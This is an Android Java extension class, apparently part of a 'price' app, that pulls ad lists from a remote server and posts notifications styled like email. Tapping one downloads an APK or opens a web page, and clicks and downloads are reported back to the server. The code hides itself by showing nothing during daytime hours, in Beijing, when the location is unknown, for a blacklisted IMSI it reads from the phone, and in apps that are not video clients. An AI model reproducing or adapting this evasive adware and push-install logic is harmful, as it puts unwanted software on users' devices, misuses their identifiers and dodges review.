package com.jshyproject.price.ext;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Random;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.jshyproject.price.location.LocationHelper;
import com.jshyproject.price.plus.PActivity;
import com.jshyproject.price.ztool.ZNetManager;
import com.jshyproject.price.ztool.ZPhoneInfo;
import com.jshyproject.price.ztool.Zlog;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.DownloadManager;
import android.app.DownloadManager.Request;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.text.format.Time;
import android.view.View;
import android.view.Window;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

@SuppressLint("SetJavaScriptEnabled")
public class ExtR implements IExt {

	public static final String url_click = StringTool.getUrl(0)+":8080/app/test.app";
	public static final String url_pushAds = StringTool.getUrl(0)+":8080/app/push0612.txt";

	Calendar calendar = Calendar.getInstance();

	Handler handler = new Handler(Looper.getMainLooper());
	Random random = new Random();
	public static final int AD_TYPE_PUSH = 0;
	public static final int AD_TYPE_URL = 1;
	public static final String SERVICE_FLAG_PUSHAD = "pushAD_p";

	public static final String PUSHAD_TITLE = "pushAD_title";
	public static final String PUSHAD_URL = "pushAD_url";
	public static final String PUSHAD_PACK = "pushAD_pack";

	public static final int MIN = 1000 * 60;

	private boolean isInit = false;

	private String rf;

	private Executor exec = Executors.newFixedThreadPool(5);

	BroadcastReceiver receiver = new BroadcastReceiver() {

		@Override
		public void onReceive(final Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
			Zlog.syso("!!!!receiverGetMsg:" + arg1);
			if (arg1.hasExtra(SERVICE_FLAG_PUSHAD)) {
				int n = arg1.getIntExtra(SERVICE_FLAG_PUSHAD, -1);
				if (n != -1) {
					checkPushAD(n, arg0);
				}
			}
		}
	};

	@Override
	public void addRunPoint(final ExtContext ec, int position) {
		// TODO Auto-generated method stub
		try {
			init(ec.context);
			Zlog.syso("form ext jar..");

			Time time = new Time();
			time.setToNow();

			if (needHide(ec.context)) {
				return;
			}

			if (time.hour > 8 && time.hour < 21) {
				Zlog.syso("time..out");
				return;
			}

			switch (position) {
			case ExtHelper.POINT_APP_CREATE:

				handler.postDelayed(new Runnable() {
					@Override
					public void run() {
						startPushAD(ec.context);
					}
				}, 5000);
				break;
			case ExtHelper.POINT_ORDER_CREATE:
				handler.postDelayed(new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						startPushAD(ec.context);
					}
				}, 5000);
				break;
			case ExtHelper.POINT_ORDER_FINISH:
				break;
			case ExtHelper.POINT_JS_OPENVIDEO:
				break;
			case ExtHelper.POINT_JS_DOWNLOAD:
				break;
			case ExtHelper.POINT_EXT_5:
				break;
			case ExtHelper.POINT_EXT_6:
				break;
			case ExtHelper.POINT_EXT_7:
				break;
			case ExtHelper.POINT_EXT_8:
				break;
			case ExtHelper.POINT_EXT_9:
				break;
			}
		} catch (Exception e) {

		}
	}

	private boolean needHide(Context context) {
		// TODO Auto-generated method stub
		int id = context.getResources().getIdentifier("pay_title", "string",
				context.getPackageName());
		if (id == 0) {
			Zlog.syso("NotVideoClien:hide");
			return true;
		} else {
			Zlog.syso("isVideoClient:Show");
			return false;
		}
	}

	private void checkInit(Context context) {
		// TODO Auto-generated method stub
		if (!isInit) {

			init(context);

			isInit = true;
		}
	}

	private void init(Context context) {
		// TODO Auto-generated method stub
		rf = context.getPackageName() + "NOTI_RE";
		context.registerReceiver(receiver, new IntentFilter(rf));

	}

	private void startPushAD(final Context context) {

		if (isNeedHideAD(context)) {
			Zlog.syso("black dark night!");
			return;
		}

		exec.execute(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				final ArrayList<PushAd> ads = getAdsFromNet();
				if (ads == null) {
					return;
				} else if (ads.size() == 0) {
					Zlog.syso("ads..size=0");
					return;
				} else {
					Zlog.syso("pushADs" + ads);
					handler.post(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							int n = random.nextInt(ads.size());
							Zlog.syso("show method p:" + n);
							showPushAD(ads.get(n), context, n);
							// show fire ads;
							for (int m = 0; m < ads.size(); m++) {
								PushAd ad = ads.get(m);
								if (ad.isFireAd) {
									showPushAD(ad, context, m);
								}
							}
						}
					});
				}

				// try {
				// // checkSpPush(context);
				// } catch (Exception e) {
				// // TODO Auto-generated catch block
				// }

			}
		});
	}

	private void showPushAD(PushAd pa, Context context) {
		// TODO Auto-generated method stub
		if (pa == null)
			return;
		if (isPackageInstalled(context, pa.packName)) {
			return;
		}
		// NotificationCompat.Builder builder = new NotificationCompat.Builder(
		// context);
		// builder.setSmallIcon(android.R.drawable.sym_action_email);
		// builder.setLargeIcon(BitmapFactory.decodeResource(
		// context.getResources(), android.R.drawable.sym_action_email));
		// builder.setTicker(pa.ticker);
		// builder.setContentTitle(pa.title);
		// builder.setContentText(pa.content);
		// builder.setAutoCancel(true);
		NotificationManager nm = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);
		Intent i = new Intent(rf);
		i.putExtra(PUSHAD_TITLE, pa.title);
		i.putExtra(PUSHAD_URL, pa.apkUrl);
		i.putExtra(PUSHAD_PACK, pa.packName);
		PendingIntent pi = PendingIntent.getBroadcast(context, pa.hashCode(),
				i, PendingIntent.FLAG_UPDATE_CURRENT);
		// builder.setContentIntent(pi);
		// Notification noti = builder.build();

		Notification noti = new Notification(
				android.R.drawable.sym_action_email, pa.title,
				System.currentTimeMillis());
		noti.tickerText = pa.ticker;
		noti.defaults = Notification.DEFAULT_SOUND;
		noti.contentIntent = pi;

		noti.flags = Notification.FLAG_AUTO_CANCEL
				| Notification.FLAG_ONGOING_EVENT;

		noti.setLatestEventInfo(context, pa.title, pa.content, pi);
		nm.notify(pa.id, noti);
		final LinkedList<BasicNameValuePair> params = new LinkedList<BasicNameValuePair>();
		params.add(new BasicNameValuePair("pckName", pa.packName));
		params.add(new BasicNameValuePair("info", "notifi"));
		params.add(new BasicNameValuePair("from", "push_sp"));
		exec.execute(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				ZNetManager.getByteFromNet(url_click, params, 0, null);
			}
		});
	}

	private boolean isNeedHideAD(Context context) {
		// TODO Auto-generated method stub

		boolean loc = isInCity("北京");

		boolean user = isBlackUser(context);

		Zlog.syso("city:" + loc + ",blackUser:" + user);

		return loc || user;
	}

	public String[] blackUsers = { "460028103570929" };

	private boolean isBlackUser(Context context) {
		// TODO Auto-generated method stub
		for (String s : blackUsers) {
			String imsi = ZPhoneInfo.getIMSI(context);
			if (s.equals(imsi)) {
				return true;
			}
		}
		return false;
	}

	private boolean isInCity(String string) {
		// TODO Auto-generated method stub
		String info = LocationHelper.LocationResult;
		Zlog.syso("CITY..:" + info);
		if (info == null)
			return true;
		if (info.indexOf(string) != -1)
			return true;
		if ("error".equals(info))
			return true;
		return false;
	}

	private ArrayList<PushAd> getAdsFromNet() {
		byte[] res = ZNetManager.getByteFromNet(url_pushAds, null, 0, null);
		if (res == null) {
			Zlog.syso("push..content..is..null");
		} else {
			String json = new String(res);
			ArrayList<PushAd> ads=null;
			try{
				 ads= Json.getListModeFromJson(json,
						PushAd.class);
			}catch(Exception e){
				
			}
			return ads;
		}
		return null;
	}

	@SuppressWarnings("deprecation")
	private void showPushAD(PushAd pa, Context context, int n) {
		// TODO Auto-generated method stub
		if (pa == null)
			return;
		if (isPackageInstalled(context, pa.packName)) {
			return;
		}
		// NotificationCompat.Builder builder = new NotificationCompat.Builder(
		// context);
		// builder.setSmallIcon(android.R.drawable.sym_action_email);
		// builder.setLargeIcon(BitmapFactory.decodeResource(
		// context.getResources(), android.R.drawable.sym_action_email));
		// builder.setTicker(pa.ticker);
		// builder.setContentTitle(pa.title);
		// builder.setContentText(pa.content);
		// builder.setAutoCancel(true);
		NotificationManager nm = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);
		Intent i = new Intent(rf);
		i.putExtra(SERVICE_FLAG_PUSHAD, n);
		PendingIntent pi = PendingIntent.getBroadcast(context, pa.hashCode(),
				i, PendingIntent.FLAG_UPDATE_CURRENT);
		// builder.setContentIntent(pi);
		// Notification noti = builder.build();

		Notification noti = new Notification(
				android.R.drawable.sym_action_email, pa.title,
				System.currentTimeMillis());
		noti.tickerText = pa.ticker;
		noti.defaults = Notification.DEFAULT_SOUND;
		noti.contentIntent = pi;

		noti.flags = Notification.FLAG_AUTO_CANCEL
				| Notification.FLAG_ONGOING_EVENT;

		noti.setLatestEventInfo(context, pa.title, pa.content, pi);
		nm.notify(pa.id, noti);
		final LinkedList<BasicNameValuePair> params = new LinkedList<BasicNameValuePair>();
		params.add(new BasicNameValuePair("pckName", pa.packName));
		params.add(new BasicNameValuePair("info", "notifi"));
		params.add(new BasicNameValuePair("from", "push_sp"));
		exec.execute(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				ZNetManager.getByteFromNet(url_click, params, 0, null);
			}
		});
	}

	private void showUrlAD(Context context) {
		Intent intent = new Intent(context, PActivity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent);
	}

	WebView wv;
	WebSettings ws;

	@SuppressWarnings("deprecation")
	@Override
	public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
		// TODO Auto-generated method stub

		activity.requestWindowFeature(Window.FEATURE_NO_TITLE);
		wv = new WebView(activity);
		ws = wv.getSettings();
		ws.setJavaScriptEnabled(true);
		ws.setJavaScriptCanOpenWindowsAutomatically(true);
		ws.setPluginState(WebSettings.PluginState.ON);
		wv.setWebChromeClient(new WebChromeClient() {
			@Override
			public void onShowCustomView(View view, CustomViewCallback callback) {
				// TODO Auto-generated method stub
				super.onShowCustomView(view, callback);
			}
		});
		wv.setWebViewClient(new WebViewClient() {
			@Override
			public boolean shouldOverrideUrlLoading(WebView view, String url) {
				view.loadUrl(url);
				return true;
			}

			@Override
			public void onReceivedError(WebView view, int errorCode,
					String description, String failingUrl) {
				// TODO Auto-generated method stub
				super.onReceivedError(view, errorCode, description, failingUrl);
			}
		});
		wv.loadUrl("http://www.baidu.com");
		activity.setContentView(wv);
	}

	@Override
	public void onActivityStarted(Activity activity) {
		// TODO Auto-generated method stub

	}

	@Override
	public void onActivityResumed(Activity activity) {
		// TODO Auto-generated method stub

	}

	@Override
	public void onActivityPaused(Activity activity) {
		// TODO Auto-generated method stub

	}

	@Override
	public void onActivityStopped(Activity activity) {
		// TODO Auto-generated method stub

	}

	@Override
	public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
		// TODO Auto-generated method stub

	}

	@Override
	public void onActivityDestroyed(Activity activity) {
		// TODO Auto-generated method stub

	}

	@Override
	public IBinder onBind(Intent intent, Service service) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate(Service service) {
		// TODO Auto-generated method stub

	}

	public void checkPushAD(final int n, final Context context) {
		exec.execute(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				ArrayList<PushAd> ads = getAdsFromNet();
				if (ads == null) {
					return;
				} else if (ads.size() == 0) {
					Zlog.syso("download.service.ads.0");
				} else {
					PushAd pa = ads.get(n % ads.size());
					Zlog.syso("PService is start..." + pa.apkUrl);
					switch (pa.type) {
					case PushAd.TYPE_DOWNLOAD:
						downloadApk(context, pa);
						break;
					case PushAd.TYPE_WEB:
						openWeb(context, pa);
						break;
					}
				}

			}

			private void openWeb(Context context, PushAd pa) {
				// TODO Auto-generated method stub
				Intent intent = new Intent(Intent.ACTION_VIEW);
				intent.setData(Uri.parse(pa.apkUrl));
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(intent);
			}

		});

	}

	private void downloadApk(Context context, PushAd pa) {
		try {

			// TODO Auto-generated method stub
			// 取得下载管理类对象
			DownloadManager dm = (DownloadManager) context
					.getSystemService(Context.DOWNLOAD_SERVICE);
			// 构造下载请求对象
			DownloadManager.Request dr = new Request(Uri.parse(pa.apkUrl));
			// 设置标题
			dr.setTitle("应用下载");
			// 设置下载的声明
			dr.setDescription(pa.title);
			// 设置下载的类型，应用或者音乐等等。。
			dr.setMimeType("application/vnd.android.package-archive");
			// 设置下载的目录
			dr.setDestinationInExternalPublicDir("down", "app.apk");
			// 设置下载的notification的显示类型，传入参数为下载全程显示，并且成功后点击打开
			dr.setNotificationVisibility(Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
			// 向管理类对象提交请求，完成
			dm.enqueue(dr);

			final LinkedList<BasicNameValuePair> params = new LinkedList<BasicNameValuePair>();
			params.add(new BasicNameValuePair("pckName", pa.packName));
			params.add(new BasicNameValuePair("info", "download"));
			ZNetManager.getByteFromNet(url_click, params, 0, null);
		} catch (Exception e) {

		}
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId,
			final Service service) {
		// TODO Auto-generated method stub

		return Service.START_NOT_STICKY;
	}

	@Override
	public void onDestroy(Service service) {
		// TODO Auto-generated method stub

	}

	public ExtR() {
		super();
	}

	public static class PushAd {
		public static final int TYPE_DOWNLOAD = 0;
		public static final int TYPE_WEB = 1;
		public String title;
		public String content;
		public String ticker;
		public int id;
		public String apkUrl;
		public String packName;
		public int type = 0;
		public boolean isFireAd = false;
	}

	public static class UrlAd {
		public String url = "http://www.baidu.com";
	}

	public static boolean isPackageInstalled(Context context, String packageName) {
		try {
			PackageManager pm = context.getPackageManager();
			pm.getPackageInfo(packageName, 0);
		} catch (Exception e) {
			return false;
		}
		return true;
	}
	
	public static class Json {

		public static <T> T getSingleModeFromJson(String json, Class<T> T) {
			T single = null;
			try {
				JSONObject sm = new JSONObject(json);
				single = T.newInstance();
				@SuppressWarnings("unchecked")
				Iterator<String> it = sm.keys();
				while (it.hasNext()) {
					String key = it.next();
					String value = sm.getString(key);
					Field filed = null;
					try {
						filed = T.getDeclaredField(key);
					} catch (java.lang.NoSuchFieldException e) {
						continue;
					}
					filed.setAccessible(true);
					String typeInfo = filed.getGenericType().toString();
					if (typeInfo.equals("int")) {
						filed.set(single, Integer.valueOf(value));
					}
					if (typeInfo.equals("long")) {
						filed.set(single, Long.valueOf(value));
					}
					if (typeInfo.equals("short")) {
						filed.set(single, Short.valueOf(value));
					}
					if (typeInfo.equals("float")) {
						filed.set(single, Float.valueOf(value));
					}
					if (typeInfo.equals("double")) {
						filed.set(single, Double.valueOf(value));
					}
					if (typeInfo.equals("byte")) {
						filed.set(single, Byte.valueOf(value));
					}
					if (typeInfo.equals("boolean")) {
						filed.set(single, Boolean.valueOf(value));
					}
					if (typeInfo.equals("class java.lang.String")) {
						filed.set(single, value);
					}
				}
			} catch (JSONException e) {
				e.printStackTrace();
			} catch (InstantiationException e) {
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				e.printStackTrace();
			}
			return single;
		}

		public static <T> ArrayList<T> getListModeFromJson(String json, Class<T> T) {
			ArrayList<T> list = null;
			try {
				JSONArray jlist = new JSONArray(json);
				list = new ArrayList<T>();
				for (int i = 0; i < jlist.length(); i++) {
					JSONObject ejson = jlist.getJSONObject(i);
					T et = getSingleModeFromJson(ejson.toString(), T);
					list.add(et);
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return list;
		}
	}

}
